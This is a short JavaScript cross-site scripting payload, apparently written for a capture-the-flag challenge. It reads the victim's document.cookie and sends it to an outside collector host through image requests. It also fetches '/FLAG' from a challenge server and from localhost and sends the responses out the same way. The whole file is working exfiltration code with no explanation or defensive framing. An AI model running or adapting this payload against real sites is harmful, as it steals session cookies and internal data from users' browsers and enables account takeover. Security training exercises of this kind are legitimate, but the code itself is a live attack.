// document.location = "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie;
(() => {
  const x = new Image();
  x.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie);
  document.body.appendChild(x);

  fetch("http://website-zyvfuj.inst.malicecyber.com/FLAG")
    .then(r => r.text())
    .then(t=>{
      const y = new Image();
      y.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?FLAG1="+t);
      document.body.appendChild(y);
    });
  
  fetch("http://localhost:5000/FLAG")
    .then(r => r.text())
    .then(t=>{
      const y = new Image();
      y.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?FLAG="+t);
      document.body.appendChild(y);
    });
})();
